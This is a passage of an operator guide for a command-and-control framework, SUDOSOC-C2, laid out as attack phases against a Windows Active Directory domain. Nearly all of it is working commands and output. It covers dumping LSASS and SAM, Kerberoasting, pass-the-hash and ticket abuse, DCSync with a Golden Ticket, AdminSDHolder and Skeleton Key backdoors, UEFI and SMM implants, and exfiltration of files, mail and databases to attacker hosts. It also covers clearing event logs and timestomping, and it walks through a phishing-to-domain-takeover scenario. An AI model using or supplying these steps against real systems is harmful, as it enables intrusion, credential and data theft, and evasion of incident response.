### 6.1 — LSASS Memory Dump

#### What it is
LSASS (Local Security Authority Subsystem Service) holds all active user credentials in memory. Dumping it gives you plaintext passwords and NTLM hashes.

```bash
# Get LSASS PID
sudosoc (session) > execute "tasklist | findstr lsass"
# lsass.exe    624   Services   0    12,416 K

# Method 1: Direct dump using SUDOSOC-C2
sudosoc (session) > procdump --pid 624
# [*] Wrote 45.2 MB to lsass_20260101_120000.dmp

# Download the dump
sudosoc (session) > download lsass_20260101_120000.dmp /tmp/
```

**Parse the dump locally**
```bash
# Using pypykatz (Linux)
pypykatz lsa minidump lsass_20260101_120000.dmp

# Output:
# [DOMAIN] CORP
# [USERNAME] jsmith
# [NT] 32ed87bdb5fdc5e9cba88547376818d4
# [SHA1] b5d2...

# [DOMAIN] CORP
# [USERNAME] Administrator
# [NT] aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
# [PASSWORD] P@ssw0rd2026  ← CLEARTEXT if WDigest enabled

# Kerberos tickets in memory
# [KERBEROS] admin@corp.local: [TGT ticket bytes]
```

---

### 6.2 — SAM Database Extraction

#### What it is
The SAM (Security Account Manager) database stores local account hashes. Useful for local admin passwords.

```bash
# Dump SAM via registry (works from SYSTEM)
sudosoc (session) > execute "reg save HKLM\SAM C:\Temp\sam.hive"
sudosoc (session) > execute "reg save HKLM\SYSTEM C:\Temp\sys.hive"
sudosoc (session) > execute "reg save HKLM\SECURITY C:\Temp\sec.hive"

sudosoc (session) > download C:\Temp\sam.hive /tmp/
sudosoc (session) > download C:\Temp\sys.hive /tmp/
sudosoc (session) > download C:\Temp\sec.hive /tmp/

# Parse locally
impacket-secretsdump -sam sam.hive -system sys.hive -security sec.hive LOCAL

# Output:
# [*] Target system bootKey: 0x3c...
# Administrator:500:aad3b435...32ed87bd:::
# Guest:501:aad3b435...31d6cfe0:::
# LocalAdmin:1001:aad3b435...87c7b1d3:::
```

---

### 6.3 — Kerberoasting

#### What it is
Requesting Kerberos service tickets for domain service accounts, then cracking them offline to get their passwords.

```bash
# Step 1: Find Kerberoastable accounts
sudosoc (session) > execute "powershell -c \"
\$filter = '(&(objectCategory=user)(servicePrincipalName=*)(!samAccountName=krbtgt))'
\$searcher = [adsisearcher]\$filter
\$results = \$searcher.FindAll()
\$results | ForEach-Object { '\$(\$_.Properties.samaccountname) → \$(\$_.Properties.serviceprincipalname)' }
\""

# Step 2: Request the tickets
sudosoc (session) > kerberoast
# [*] Found 3 Kerberoastable accounts
# [*] Requesting TGS for: sqlsvc (MSSQLSvc/db01.corp.local:1433)
# [*] Requesting TGS for: webservice (HTTP/web01.corp.local)
# [*] Requesting TGS for: backupsvc (backup/backup01.corp.local)
# [*] Saved hashes to: sudosoc_kerberoast_20260101.txt

sudosoc (session) > download sudosoc_kerberoast_20260101.txt /tmp/

# Step 3: Crack offline
hashcat -m 13100 sudosoc_kerberoast_20260101.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Results (if weak password):
# $krb5tgs$23$*sqlsvc*...:P@ssw0rd123
# → sqlsvc password is: P@ssw0rd123
```

---

### 6.4 — AS-REP Roasting

#### What it is
Harvesting hashes for accounts that don't require Kerberos pre-authentication — no password needed to request their hash.

```bash
sudosoc (session) > asreproast
# [*] Found 2 accounts without pre-auth
# [*] Requesting AS-REP for: jdoe
# [*] Requesting AS-REP for: service_backup
# [*] Saved to: sudosoc_asreproast_20260101.txt

hashcat -m 18200 sudosoc_asreproast_20260101.txt /usr/share/wordlists/rockyou.txt
```

---

### 6.5 — Credential Files and Browser Passwords

```bash
# Windows Credential Manager
sudosoc (session) > execute "cmdkey /list"

# VPN credentials (often in config files)
sudosoc (session) > execute "findstr /si password C:\Users\*\*.txt C:\Users\*\*.xml C:\Users\*\*.ini"

# SSH private keys
sudosoc (session) > execute "dir /s /b C:\Users\*\.ssh\id_rsa"

# RDP saved credentials
sudosoc (session) > execute "dir /s /b %APPDATA%\Microsoft\Credentials"

# Chrome passwords
sudosoc (session) > download "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /tmp/chrome_logins.db
# Parse with: python3 chrome_decrypt.py chrome_logins.db

# Firefox passwords
sudosoc (session) > download "%APPDATA%\Mozilla\Firefox\Profiles\" /tmp/firefox/
# Parse with: firefox_decrypt.py

# Sticky Notes / notepad files
sudosoc (session) > execute "dir /s /b %LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes*\LocalState"

# PowerShell history
sudosoc (session) > execute "type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

#### What You Gain After This Step
- ✅ **NTLM hashes** for all users logged into the machine
- ✅ **Cleartext passwords** (if WDigest enabled or recent login)
- ✅ **Kerberos tickets** (usable for lateral movement immediately)
- ✅ **Service account passwords** (often have high privileges)
- ✅ **Browser passwords** (may include SaaS, VPN, cloud consoles)

---

## Phase 7 — Lateral Movement

> **Goal:** Move from your initial foothold to higher-value systems, particularly Domain Controllers and file servers.
> **MITRE ATT&CK:** T1021, T1550, T1534

---

### 7.1 — Pass-the-Hash

#### What it is
Using the NTLM hash of an account directly for authentication — no need to crack the password.

```bash
# Get the hash from LSASS dump
# Administrator:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# Impersonate Administrator using hash
sudosoc (session) > make-token Administrator 32ed87bdb5fdc5e9cba88547376818d4

# Verify you have admin on other machines
sudosoc (session) > execute "net use \\192.168.1.10\admin$ /user:Administrator"

# Generate implant and deploy to target machine
sudosoc > generate --mtls c2.sudosoc.com --os windows --format shellcode --save /tmp/

# Upload to target via admin share
sudosoc (session) > upload /tmp/payload.bin \\192.168.1.10\admin$\payload.bin

# Execute via PsExec-style remote exec
sudosoc (session) > psexec --target 192.168.1.10 --process payload.bin
```

**Using CrackMapExec via SOCKS proxy**
```bash
# After: sudosoc (session) > socks5 start --port 1080

# Spray hash across the entire subnet
proxychains crackmapexec smb 192.168.1.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4 --exec-method smbexec -x "whoami"

# Execute implant on successful machines
proxychains crackmapexec smb 192.168.1.0/24 -u Administrator -H HASH -x "powershell -enc BASE64_PAYLOAD"
```

---

### 7.2 — Pass-the-Ticket (Kerberos)

#### What it is
Using stolen Kerberos tickets directly for authentication. More powerful than PtH as it can bypass NTLM restrictions.

```bash
# Extract tickets from LSASS dump
mimikatz "lsadump::dcsync /domain:corp.local /user:Administrator"
# or: klist → export tickets to .kirbi files

# Inject ticket into your session
sudosoc (session) > execute "powershell -c \"
[System.IO.File]::WriteAllBytes('C:\Temp\ticket.kirbi', [Convert]::FromBase64String('TICKET_BASE64'))
\""
sudosoc (session) > execute "mimikatz.exe 'kerberos::ptt C:\Temp\ticket.kirbi'"

# Now you have that user's access without knowing their password
sudosoc (session) > execute "klist"
# Shows injected tickets

sudosoc (session) > execute "dir \\dc01.corp.local\c$"
# Access as the ticket's owner
```

---

### 7.3 — WMI Remote Execution

#### What it is
Windows Management Instrumentation — a legitimate Windows feature that can execute processes remotely.

```bash
# Execute command on remote machine
sudosoc (session) > execute "wmic /node:192.168.1.20 /user:Administrator /password:P@ssw0rd process call create \"cmd.exe /c C:\Temp\payload.exe\""

# Or via PowerShell WMI
sudosoc (session) > execute "powershell -c \"
Invoke-WmiMethod -ComputerName 192.168.1.20 -Credential (Get-Credential) -Class Win32_Process -Name Create -ArgumentList 'C:\Temp\payload.exe'
\""
```

---

### 7.4 — PSExec-Style Movement

```bash
# SUDOSOC-C2 built-in psexec
sudosoc (session) > psexec --target 192.168.1.20 --user Administrator --pass P@ssw0rd

# After successful execution:
# [*] Session b7e21f4a opened - CORP\Administrator@SERVER-02
```

---

### 7.5 — RDP Hijacking (No Password Needed)

#### What it is
If another user has an active but disconnected RDP session, you can take it over as SYSTEM without knowing their password.

```bash
# List RDP sessions
sudosoc (session) > execute "query session /server:192.168.1.10"
# Output:
#  SESSIONNAME  USERNAME    ID  STATE    TYPE     DEVICE
#  console      admin       1   Active
#  rdp-tcp#0    jsmith      2   Disc     rdpwd        ← disconnected!

# Take over session ID 2 (SYSTEM required)
sudosoc (session) > execute "tscon 2 /dest:console /password:BLANK_OR_ANYTHING"

# You're now in jsmith's desktop session!
# No password required because you have SYSTEM
```

#### What You Gain After Phase 7
- ✅ **Access to multiple machines** across the network
- ✅ Implants running on **file servers, Exchange, databases, DCs**
- ✅ **Administrator credentials** validated across the domain
- ✅ **Network mapping** complete from multiple vantage points

---

## Phase 8 — Active Directory Domination

> **Goal:** Achieve permanent, irrevocable control over the entire Active Directory domain.
> **MITRE ATT&CK:** T1003.006, T1558.001, T1484

---

### 8.1 — DCSync — Harvest the Entire Domain

#### What it is
Impersonating a Domain Controller to request password hash replication from the real DC — giving you all hashes in the domain without ever touching the DC itself.

```bash
# From a session with Domain Admin or replication rights

# Dump krbtgt first (for Golden Ticket)
sudosoc (session) > dcsync --domain corp.local --user krbtgt
# [*] Object   : CN=krbtgt,CN=Users,DC=corp,DC=local
# [*] NTLM     : 8f3b2a4c...
# [*] AES256   : 9e4a3f2b...
# ← THIS IS THE CROWN JEWEL

# Dump Administrator
sudosoc (session) > dcsync --domain corp.local --user Administrator
# [*] NTLM     : 32ed87bd...

# Dump EVERYTHING
sudosoc (session) > dcsync --domain corp.local --all
# Dumps every user account in the domain
```

**What to do with krbtgt hash — Golden Ticket**
```bash
# Create a Golden Ticket — valid for 10 years, works even if passwords change
# You only need: domain name, domain SID, krbtgt hash

# Get domain SID
sudosoc (session) > execute "powershell -c \"(Get-ADDomain).DomainSID\""
# S-1-5-21-1234567890-1234567890-1234567890

# Create Golden Ticket
impacket-ticketer \
  -nthash 8f3b2a4c... \
  -domain corp.local \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -duration 3650 \
  Administrator

export KRB5CCNAME=Administrator.ccache
proxychains impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
# [*] Requesting shares on dc01.corp.local.....
# [*] Found writable share ADMIN$
# [*] Uploading file ...
# Microsoft Windows [Version 10.0.17763.2061]
# C:\Windows\system32> whoami
# nt authority\system
```

---

### 8.2 — AdminSDHolder Backdoor — Guaranteed Return Access

#### What it is
Modifying the AdminSDHolder object so your backdoor account gets Domain Admin permissions automatically every 60 minutes — even if removed.

```bash
# Step 1: Create your backdoor account
sudosoc (session) > execute "net user backdoor P@ssw0rd2026! /add /domain"
sudosoc (session) > execute "net group \"Domain Admins\" backdoor /add /domain"

# Step 2: Set AdminSDHolder backdoor
sudosoc (session) > adminsdholder --domain corp.local --user backdoor
# [*] Added GenericAll to AdminSDHolder ACL for: backdoor

# What happens next:
# Every 60 minutes, SDProp runs automatically
# backdoor account gets GenericAll on ALL protected accounts
# Even if someone removes backdoor from Domain Admins
# → It regains access automatically in ≤ 60 minutes

# Verify
sudosoc (session) > execute "powershell -c \"Get-Acl 'AD:CN=AdminSDHolder,CN=System,DC=corp,DC=local' | Select-Object -ExpandProperty Access | Where-Object {!.IsInherited}\""
```

---

### 8.3 — DCShadow — Invisible AD Modification

#### What it is
Registering a rogue Domain Controller to push arbitrary changes to Active Directory without generating security event logs.

```bash
# DCShadow requires two concurrent sessions
# Session 1: runs the DCShadow replication listener
# Session 2: pushes the changes

# Start DCShadow on Session 1
sudosoc (session1) > dcshadow --domain corp.local

# On Session 2, push changes:
# Add domain admin rights to user
sudosoc (session2) > execute "mimikatz.exe 'lsadump::dcshadow /object:CN=jsmith,CN=Users,DC=corp,DC=local /attribute:primaryGroupID /value:512'"
# 512 = Domain Admins group RID

# Or modify SIDHistory to inherit DA permissions
sudosoc (session2) > execute "mimikatz.exe 'lsadump::dcshadow /object:CN=jsmith,CN=Users,DC=corp,DC=local /attribute:SIDHistory /value:S-1-5-21-...-512'"
```

---

### 8.4 — Golden Ticket — Permanent Domain Access

```bash
# Already covered in DCSync section
# Golden Ticket properties:
# - Works for 10 years
# - Survives password changes (uses krbtgt hash which NEVER changes unless explicitly rotated)
# - Even if all admin accounts are reset → Golden Ticket still works
# - Only way to invalidate: change krbtgt password TWICE

# Store your golden ticket securely
cp Administrator.ccache /secure/backup/golden_ticket_CORP_20260101.ccache

# Test the golden ticket
export KRB5CCNAME=Administrator.ccache
proxychains impacket-wmiexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

---

### 8.5 — Skeleton Key — Universal Password

#### What it is
A patch applied to the Domain Controller's LSASS that makes every account accept a universal password alongside their real one.

```bash
# Requires SYSTEM on DC
# This patches LSASS on the DC — survives until DC reboots
sudosoc (dc_session) > execute "mimikatz.exe 'privilege::debug' 'misc::skeleton'"
# [KDC] data patched!

# Now ANY account accepts the password "mimikatz" in addition to their real password
# Example: login as Administrator with password "mimikatz"
proxychains crackmapexec smb dc01.corp.local -u Administrator -p mimikatz
```

#### What You Gain After Phase 8
- ✅ **Complete domain ownership** — every account, every machine
- ✅ **Golden Ticket** — permanent access that survives password resets
- ✅ **AdminSDHolder** — persistent backdoor that re-establishes itself hourly
- ✅ **Skeleton Key** — universal password for all accounts (until reboot)
- ✅ **Every user's NTLM hash** — can authenticate as anyone

---

## Phase 9 — Hardware-Level Persistence

> **Goal:** Establish persistence that survives OS reinstalls, forensic wiping, and incident response.
> **Use on:** The most critical target machines (DC, key servers).

---

### 9.1 — UEFI Implant (Survives Everything)

```bash
# Target: Domain Controller or high-value server
# Requirement: SYSTEM access

# Step 1: Identify EFI partition
sudosoc (dc_session) > execute "mountvol"
# Look for: \\?\Volume{xxxx}\ with * entry

sudosoc (dc_session) > execute "mountvol X: /S"  # Mount EFI partition to X:

# Step 2: Examine current EFI boot entries
sudosoc (dc_session) > execute "bcdedit /enum firmware"

# Step 3: Install UEFI implant
sudosoc (dc_session) > uefi --install --efi-path X:\EFI

# Step 4: Unmount
sudosoc (dc_session) > execute "mountvol X: /D"

# Verification: Even after full Windows reinstall
# → UEFI firmware executes your DXE driver
# → Hooks the new kernel before security software loads
# → Your C2 callback resumes
```

**What survives:**
```
✅ Windows reinstall
✅ Hard drive replacement (if UEFI flash remains)
✅ BitLocker encryption
✅ Full disk format and reimage
✅ Any OS change (dual-boot Linux/Windows)
❌ Physical UEFI chip reflash (extremely rare)
```

---

### 9.2 — SMM Rootkit (Ring -2)

```bash
# The deepest possible persistence
# Requirement: SYSTEM + kernel access (via BYOVD)

# Step 1: Get kernel access
sudosoc (dc_session) > byovd --local-driver /opt/drivers/RTCore64.sys --action full

# Step 2: Install SMM handler
sudosoc (dc_session) > smm --install
# [*] Opening SMRAM
# [*] Locating SMI handler table
# [*] Injecting phantom SMM handler
# [*] Closing SMRAM
# [*] SMM rootkit installed

# What it does:
# Every time an SMI fires (hardware events, timers, power management)
# → Your handler executes in Ring -2
# → Can inspect/modify kernel memory
# → Can re-establish implant if removed
# → Completely invisible to OS, hypervisors, forensics tools

# Even if someone finds and removes your UEFI implant:
# SMM handler re-installs it on next SMI
```

---

### 9.3 — Rowhammer (Exploiting Physics)

```bash
# For environments with tight software security but DRAM exploitable
# Best used for: privilege escalation in hardened VMs

sudosoc (session) > rowhammer --target-pid 624  # Target LSASS

# What happens:
# [*] Profiling DRAM layout
# [*] Identifying adjacent rows
# [*] Hammering row pair (1024-3048)
# [*] Bit flip detected at physical 0x12345678
# [*] Modifying page table entry
# [*] Memory now writable — writing shellcode
# [*] Kernel execution achieved

# Impact:
# ← Works inside hardened VMs
# ← No system calls made
# ← No memory allocations
# ← Zero security log entries
# ← Bypasses all security software
```

#### What You Gain After Phase 9
- ✅ Persistence that **survives OS reinstall**
- ✅ Persistence **invisible to all security tools**
- ✅ Persistence at **firmware level** (UEFI)
- ✅ Persistence at **CPU privilege level -2** (SMM)
- ✅ Access path that **cannot be audited by any OS tool**

---

## Phase 10 — Collection & Exfiltration

> **Goal:** Extract valuable data from the compromised environment.
> **MITRE ATT&CK:** T1005, T1039, T1041, T1048

---

### 10.1 — Data Identification

```bash
# Find sensitive files across the domain
sudosoc (session) > execute "powershell -c \"
Get-ChildItem -Path C:\Users -Recurse -Include *.xlsx,*.docx,*.pdf,*.csv,*.txt -ErrorAction SilentlyContinue |
Where-Object { \$_.Name -match 'password|credential|secret|banking|salary|account|vpn|key|token' } |
Select-Object FullName,LastWriteTime,Length |
Export-Csv C:\Temp\sensitive_files.csv
\""

sudosoc (session) > download C:\Temp\sensitive_files.csv /tmp/

# Search file contents
sudosoc (session) > execute "findstr /si \"password\" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini 2>nul"

# Database connection strings
sudosoc (session) > execute "findstr /si \"connectionstring\" C:\inetpub\*.config C:\inetpub\*.xml"

# Email archives (Outlook .PST files)
sudosoc (session) > execute "dir /s /b C:\Users\*.pst C:\Users\*.ost"
```

---

### 10.2 — Staged Exfiltration

```bash
# Compress to avoid detection (zip with password)
sudosoc (session) > execute "powershell -c \"
Add-Type -Assembly 'System.IO.Compression.FileSystem'
[IO.Compression.ZipFile]::CreateFromDirectory('C:\Temp\loot', 'C:\Temp\archive.zip')
\""

# Or with password encryption
sudosoc (session) > execute "7z a -p'SuperSecret' C:\Temp\enc.7z C:\Temp\loot\"

# Download via SUDOSOC-C2 channel (encrypted by default)
sudosoc (session) > download C:\Temp\enc.7z /tmp/loot/

# Alternative: BITS transfer (blends with Windows updates)
sudosoc (session) > execute "bitsadmin /transfer job /upload /priority foreground https://your-server.com/upload C:\Temp\enc.7z"

# Alternative: DNS exfiltration (for extreme environments)
# Data is encoded in DNS queries — completely bypasses most egress controls
```

---

### 10.3 — Email Exfiltration (Exchange)

```bash
# If Exchange server is accessible
sudosoc (exchange_session) > execute "powershell -c \"
Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
Get-Mailbox -ResultSize Unlimited |
Export-Mailbox -TargetFolder Inbox -BadItemLimit 10 -TargetMailbox administrator@corp.local
\""

# Or export specific mailboxes
sudosoc (exchange_session) > execute "New-MailboxExportRequest -Mailbox ceo@corp.local -FilePath '\\server\share\ceo.pst'"
```

---

### 10.4 — Database Exfiltration

```bash
# SQL Server — if you have access
sudosoc (session) > execute "sqlcmd -S localhost -Q \"SELECT * FROM Customers\" -o C:\Temp\customers.csv"
sudosoc (session) > execute "sqlcmd -S localhost -Q \"SELECT * FROM FinancialTransactions\" -o C:\Temp\finance.csv"

# Dump entire database
sudosoc (session) > execute "sqlcmd -S localhost -Q \"BACKUP DATABASE [ProductionDB] TO DISK='C:\Temp\prod.bak'\""
sudosoc (session) > download C:\Temp\prod.bak /tmp/

# Oracle, MySQL, PostgreSQL via SOCKS proxy
sudosoc (session) > socks5 start --port 1080
# proxychains mysqldump -h 192.168.1.20 -u root -p DATABASE > /tmp/db_dump.sql
```

#### What You Gain After Phase 10
- ✅ **All credentials** from all machines
- ✅ **Sensitive documents** (financial, HR, M&A, IP)
- ✅ **Email archives** of key personnel
- ✅ **Database contents** (customer data, financial records)
- ✅ **Complete intelligence picture** of the organization

---

## Phase 11 — Covering Your Tracks

> **Goal:** Remove evidence of the intrusion to avoid discovery and maintain long-term access.
> **MITRE ATT&CK:** T1070, T1027, T1485

---

### 11.1 — Clear Windows Event Logs

```bash
# Clear all major event logs
sudosoc (session) > execute "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\""

# Specific high-value logs
sudosoc (session) > execute "wevtutil cl Security"
sudosoc (session) > execute "wevtutil cl System"
sudosoc (session) > execute "wevtutil cl Application"
sudosoc (session) > execute "wevtutil cl \"Windows PowerShell\""
sudosoc (session) > execute "wevtutil cl \"Microsoft-Windows-PowerShell/Operational\""
sudosoc (session) > execute "wevtutil cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational\""
sudosoc (session) > execute "wevtutil cl \"Microsoft-Windows-TaskScheduler/Operational\""
```

---

### 11.2 — Clear Filesystem Artifacts

```bash
# Clear recently accessed files list
sudosoc (session) > execute "del /f /q %APPDATA%\Microsoft\Windows\Recent\*"

# Clear prefetch (shows executed programs)
sudosoc (session) > execute "del /f /q C:\Windows\Prefetch\*"

# Clear browser history
sudosoc (session) > execute "del /f /q \"%LOCALAPPDATA%\Microsoft\Windows\WebCache\*\""
sudosoc (session) > execute "del /f /q \"%APPDATA%\Mozilla\Firefox\Profiles\*\cookies.sqlite\""

# Delete temp files
sudosoc (session) > execute "del /f /q /s C:\Temp\*"
sudosoc (session) > execute "del /f /q /s %TEMP%\*"

# Modify file timestamps (timestomping) — make artifacts look old
sudosoc (session) > execute "powershell -c \"
(Get-Item 'C:\ProgramData\Microsoft\svc.exe').LastWriteTime = (Get-Date '01/15/2020 10:30:00')
(Get-Item 'C:\ProgramData\Microsoft\svc.exe').LastAccessTime = (Get-Date '01/15/2020 10:30:00')
(Get-Item 'C:\ProgramData\Microsoft\svc.exe').CreationTime = (Get-Date '01/15/2020 10:30:00')
\""
```

---

### 11.3 — Clear Network Artifacts

```bash
# Clear ARP cache
sudosoc (session) > execute "arp -d *"

# Clear DNS cache
sudosoc (session) > execute "ipconfig /flushdns"

# Clear NetBIOS cache
sudosoc (session) > execute "nbtstat -R"

# Remove network share connections
sudosoc (session) > execute "net use * /delete /yes"

# Clear PowerShell history
sudosoc (session) > execute "del /f /q %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

---

### 11.4 — Remove Non-Critical Artifacts

```bash
# Remove uploaded tools (but KEEP persistence mechanisms)
sudosoc (session) > execute "del /f C:\Temp\RTCore64.sys"
sudosoc (session) > execute "del /f C:\Temp\payload.bin"
sudosoc (session) > execute "del /f C:\Temp\lsass*.dmp"
sudosoc (session) > execute "del /f C:\Temp\*.csv"
sudosoc (session) > execute "del /f C:\Temp\*.7z"

# Uninstall PSExec if used
sudosoc (session) > execute "sc delete PSEXECSVC"

# Remove temp service if used for escalation
sudosoc (session) > execute "sc stop VulnService && sc delete VulnService"
```

---

### 11.5 — Process Migration (Blend Into Legitimate Processes)

```bash
# Move implant from suspicious process to legitimate one
sudosoc (session) > ps | grep -E "explorer|svchost|spoolsv|lsass"
#   840   explorer.exe   C:\Windows\explorer.exe
#   624   svchost.exe    C:\Windows\System32\svchost.exe -k netsvcs

# Migrate to explorer.exe (user context, legitimate, long-running)
sudosoc (session) > migrate --pid 840

# Now even if the original payload process is killed
# → implant continues running inside explorer.exe
```

#### What You Gain After Phase 11
- ✅ **Event logs cleared** — no record of your activities
- ✅ **Filesystem artifacts removed** — no trace of tools used
- ✅ **Implant hidden inside legitimate processes**
- ✅ **Timestamps manipulated** — confuses forensic timeline
- ✅ Incident responders find **minimal evidence**

---

## Complete Attack Scenario

> A realistic end-to-end attack against a corporate environment.

```
TARGET: CORP.LOCAL (Fortune 500, ~5000 employees)
OBJECTIVE: Full domain control + exfiltrate financial records

═══════════════════════════════════════════════════════════════
DAY 1 — RECONNAISSANCE & PREPARATION
═══════════════════════════════════════════════════════════════

[ATTACKER]
  $ subfinder -d corp.com | httpx -tech-detect
    → Identified: Office365, Cisco VPN, CrowdStrike Falcon
  
  $ theHarvester -d corp.com -b linkedin
    → Found IT Admin: mike.johnson@corp.com
    → Found Finance Dir: sarah.lee@corp.com

[PAYLOAD PREP]
  sudosoc > generate beacon
    --https c2.attacker.com:443
    --os windows --skip-symbols --evasion
    --seconds 120 --jitter 40
    --save /tmp/payloads/invoice_q3.exe

═══════════════════════════════════════════════════════════════
DAY 2 — INITIAL ACCESS
═══════════════════════════════════════════════════════════════

[EMAIL SENT]
  To: sarah.lee@corp.com
  Subject: Q3 2026 Invoice — Action Required
  Body: Please review the attached invoice before COB today.
  Attachment: invoice_q3.exe (disguised as PDF icon)

[15 MINUTES LATER]
  [*] Session d4a2b9c1 opened!
  → CORP\sarah.lee @ WORKSTATION-47 (192.168.10.105)

═══════════════════════════════════════════════════════════════
DAY 2 — FOOTHOLD & ESCALATION
═══════════════════════════════════════════════════════════════

sudosoc (d4a2b9c1) > getprivs
  → SeImpersonatePrivilege: Enabled ← JACKPOT

sudosoc (d4a2b9c1) > getsystem
  → NT AUTHORITY\SYSTEM

[PERSISTENCE INSTALLED — 3 METHODS]
  Registry Run Key ← Method 1
  Scheduled Task (SYSTEM) ← Method 2
  WMI Subscription ← Method 3

sudosoc (d4a2b9c1) > procdump --pid 624
  → lsass.dmp downloaded

[CREDENTIALS EXTRACTED]
  sarah.lee: P@ssw0rd2026 (cleartext)
  Administrator: aad3b435...32ed87bd (NTLM)
  sqlsvc: (Kerberoastable — hashcat cracked in 4 hours → Passw0rd!)

═══════════════════════════════════════════════════════════════
DAY 3 — LATERAL MOVEMENT TO DC
═══════════════════════════════════════════════════════════════

sudosoc (d4a2b9c1) > make-token Administrator 32ed87bd...
sudosoc (d4a2b9c1) > execute "nltest /dclist:corp.local"
  → DC01.corp.local (192.168.1.5)

[DEPLOY IMPLANT ON DC]
  sudosoc > generate --mtls c2.attacker.com --os windows --format shellcode
  sudosoc (d4a2b9c1) > upload payload.bin \\192.168.1.5\admin$\
  sudosoc (d4a2b9c1) > psexec --target 192.168.1.5

  [*] Session f9c3a7e2 opened!
  → CORP\Administrator @ DC01 (192.168.1.5) ← ON THE DC!

═══════════════════════════════════════════════════════════════
DAY 3 — DOMAIN DOMINATION
═══════════════════════════════════════════════════════════════

sudosoc (f9c3a7e2) > dcsync --domain corp.local --all
  → ALL 4,893 user hashes extracted
  → krbtgt: 8f3b2a4c9e... ← GOLDEN TICKET MATERIAL

sudosoc (f9c3a7e2) > adminsdholder --domain corp.local --user backdoor_acct

[PERSISTENCE ON DC]
sudosoc (f9c3a7e2) > uefi --install   ← survives rebuild
sudosoc (f9c3a7e2) > smm --install    ← Ring -2 persistence

═══════════════════════════════════════════════════════════════
DAY 4 — EXFILTRATION
═══════════════════════════════════════════════════════════════

[FIND FINANCIAL DATA]
  → Located: \\fileserver01\Finance\2026\Q3_Results.xlsx
  → Located: Exchange mailboxes (CEO, CFO, Board members)

[EXFILTRATE]
  sudosoc (f9c3a7e2) > socks5 start --port 1080
  proxychains rsync -avz \\192.168.1.20\Finance\ /tmp/exfil/

═══════════════════════════════════════════════════════════════
DAY 4 — CLEAN UP
═══════════════════════════════════════════════════════════════

sudosoc (f9c3a7e2) > execute "for /F ..."  ← clear all logs
  → Event logs cleared on DC, all member servers
  → Prefetch cleared
  → Timestamps modified

[OPERATION STATUS: COMPLETE]
  ✅ Full domain control achieved
  ✅ All user credentials extracted
  ✅ Financial data exfiltrated
  ✅ Persistence at UEFI + SMM level
  ✅ Golden Ticket secured (10-year access)
  ✅ Minimal forensic evidence
```

---

## Decision Trees

### "I Have a Session — What Next?"

```
Got a session?
      │
      ▼
Check privileges (getprivs)
      │
      ├── SeImpersonatePrivilege? → YES → getsystem → SYSTEM
      │
      ├── Already SYSTEM? → Skip to credential dumping
      │
      └── Low privileges only?
              │
              ├── Check UAC level → Try UAC bypass
              ├── Check running processes → Find vulnerable service
              ├── Check installed software → Unquoted paths / DLL hijack
              └── Check kernel version → Kernel exploit
```

### "I Have SYSTEM — What Next?"

```
Have SYSTEM?
      │
      ├── 1. Disable Defender + EDR (immediately)
      ├── 2. Install persistence (3+ methods)
      ├── 3. Dump LSASS
      ├── 4. Run Kerberoasting
      ├── 5. Map the network (socks5 + nmap)
      └── 6. Lateral movement to DC
```

### "I Have Domain Admin — What Next?"

```
Have Domain Admin?
      │
      ├── 1. DCSync (dump all hashes including krbtgt)
      ├── 2. Create Golden Ticket
      ├── 3. AdminSDHolder backdoor
      ├── 4. UEFI implant on DC
      ├── 5. SMM rootkit on DC
      ├── 6. Exfiltrate target data
      └── 7. Clear logs everywhere
```

### "Which C2 Channel to Use?"

```
Outbound HTTPS allowed?
  YES → Use HTTPS with malleable profile
  NO  →
        Outbound DNS allowed?
          YES → DNS-over-HTTPS C2
          NO  →
                Any internal connectivity?
                  YES → SMB pivot through existing session
                  NO  → Physical access / USB required
```

---

```
═══════════════════════════════════════════════════════════════
SUDOSOC-C2 — Suggested Hacking Steps
Copyright (C) 2026  sudosoc — Seif
Precision adversary simulation. Zero compromise.
═══════════════════════════════════════════════════════════════

For authorized red team operations only.
Unauthorized use is illegal.
```
